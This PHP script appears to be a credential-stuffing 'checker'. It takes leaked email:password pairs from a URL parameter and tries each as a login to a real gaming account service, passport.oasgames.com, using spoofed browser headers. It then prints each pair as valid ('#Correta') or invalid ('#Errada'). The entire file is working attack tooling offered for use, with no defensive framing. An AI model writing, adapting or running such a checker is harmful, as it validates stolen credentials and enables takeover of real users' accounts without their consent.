<?php
error_reporting(0);
    $lista   = $_GET['lista'];
    $separa = explode(":", $lista);
    $email = trim($separa[0]);
    $senha = trim($separa[1]);


$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "https://passport.oasgames.com/?m=login&email=".$email."&pwd=".$senha."&remember=1&callback=jQuery17204984309197236034_1610318178469&_=1610318190848");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie4.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie4.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
"accept: */*",
"content-type: text/javascript; charset=UTF-8",
"accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
"referer: https://naruto.oasgames.com/",
"user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
));
curl_setopt($ch, CURLOPT_POST, 0);

$resultado1 = curl_exec($ch);
$decodando = json_decode($resultado1);
$explodindo1 = substr($resultado1, 56, -1);
$explodindo2 = substr($explodindo1, 0, 2);


if ($explodindo2 == 'ok'){
    echo '<font class="badge badge-success">#Correta </font> '.$email.' '.$senha.'</font><br>';
}elseif ($explodindo2 == 'fa'){
    echo '<font class="badge badge-danger">#Errada </font> '.$email.' '.$senha.' X</font><br>';
}else{
    echo '<font class="badge badge-danger">#Errada </font> '.$email.' '.$senha.'</font><br>';
}
    curl_close($ch);

?>
